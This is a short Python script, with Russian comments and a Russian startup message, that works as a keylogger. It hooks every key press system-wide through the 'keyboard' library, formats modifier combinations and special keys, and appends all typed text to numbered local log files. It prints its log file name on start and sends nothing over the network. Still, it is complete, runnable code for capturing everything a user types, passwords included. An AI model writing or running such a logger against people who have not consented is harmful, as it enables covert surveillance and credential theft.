import keyboard
import os

def genlog():
    tm = 1
    while os.path.exists(f"log{tm}.txt"):
        tm += 1
    return f"log{tm}.txt"

CURRENT_LOG = genlog()
print(f"Скрипт запущен. Лог пишется в: {CURRENT_LOG}")

def format_key_event(event):
    key_name = event.name

    is_ctrl = keyboard.is_pressed('ctrl')
    is_alt = keyboard.is_pressed('alt')
    is_shift = keyboard.is_pressed('shift')
    is_win = keyboard.is_pressed('windows') or keyboard.is_pressed('left windows') or keyboard.is_pressed('right windows')

    system_keys = ['ctrl', 'alt', 'shift', 'windows', 'left windows', 'right windows']

    if (is_ctrl or is_alt) and key_name not in ['ctrl', 'alt', 'shift']:
        combi = []
        if is_ctrl:
            combi.append('ctrl')
        if is_alt:
            combi.append('alt')
        if is_win:
            combi.append('win')
        if is_shift:
            combi.append("shift")

        return f"[{'+'.join(combi)} + {key_name}]"

    if key_name == 'space':
        return ' '
    elif key_name == 'enter':
        return '\n'
    elif key_name == 'backspace':
        return ' [backspace] '
    elif len(key_name) > 1:
        # Для остальных одиночных системных (tab, caps lock, f12 и т.д.)
        return f" [{key_name}] "
    elif key_name in system_keys:
        return ' [win] ' if 'windows' in key_name else f" [{key_name}] "
    else:
        # Для обычных букв и цифр
        return key_name

def onpress(key):
    text_to_write = format_key_event(key)
    with open(CURRENT_LOG, "a", encoding='utf-8') as file:
        file.write(text_to_write)



keyboard.on_press(onpress)

keyboard.wait()
